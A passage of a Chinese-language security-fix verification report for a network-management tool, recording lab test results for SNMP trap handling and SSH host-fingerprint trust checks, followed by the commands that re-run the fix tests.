- 未入库：错误团体字 `bogus` 的 v2c Trap
- `status()`：`rxPackets=6, malformed=0, v3AuthFail=0, communityGuard=true, communityReject=1, buffered=5, diskDropped=0`
- 覆盖：**M2**（团体字白名单真机接受/拒绝）、**M3**（接收侧按发送方 engineID 派生 Kul，`v3AuthFail=0`）、**H1**（新的 `diskDropped/dirsRecycled/hostsOverCap` 计数在位且无异常增长）

**SSH 采集 + 指纹信任 7/7 通过**（`test/_frlab/verify-ssh.js`，`ShellManager.runOneShot` + 与 electron-main 同接线）：

- 首连 TOFU 经信任门放行、同 host:port 重复采集不误判、信任库键为 `192.168.50.148:2211` 且记 SHA256
- **人为把该 host:port 的指纹改成别的值后再采集 → 被拒**，错误为「主机指纹变化，可能遭到中间人攻击，已拒绝连接」（**M2 的真机验证**）
- 同一 IP 的另一端口（2212）为独立记录、不受影响（**M1**）
- 备注：该实验室设备 SSH 登录落的是 bash，设备命令需写 `sudo vtysh -c "..."`（`admin` 已配 vtysh 免密 sudo）

**新增实验室工具**（均在已忽略的 `test/_frlab/`）：`lab.js`（自写 runner——原 `sshrun.js` 的 connect 选项漏传 host/port，一直在连 localhost）、`verify-snmp.js`、`verify-ssh.js`、`trap-listen.js`、`probe-auth.js`。

### 11.5 修复后的复核命令

```powershell
node test/run-tests.js                 # 1605 通过 / 0 失败 / 3 跳过（缺 python 依赖）
node --check js/svc-syslog.js          # 各改动文件语法
node test/_fix_h1_verify.js            # H1：LRU + 回收 + 限速 + port=0 启动语义
node test/_fix_m2_verify.js            # M1/M2：真实 ssh2 双端口 + 采集指纹门
node test/_fix_m3_verify.js            # M3：KDF KAT + 随机 engineID 开销
node test/_fix_tftp_verify.js          # M4/M5：会话槽逐出 + RRQ 放大收敛
node test/_fix_ai_verify.js            # M6/M7：Key 主机绑定 + 不回显响应体
node test/_fix_updater_verify.js       # L11：Release 混挂旧包时不挑旧包

# 真机（192.168.50.148 FRR 实验室；需先 node test/_frlab/_deploy.js start）
node test/_frlab/verify-snmp.js        # 22/22：v2c + v3 authPriv + 厂商 OID + 错误团体字
node test/_frlab/verify-ssh.js         # 7/7：采集 + 指纹信任门（含篡改指纹被拒）
node test/_frlab/trap-listen.js 75     # 再另开一端执行 frlab trap <rX> <v2c|v3> 触发
```

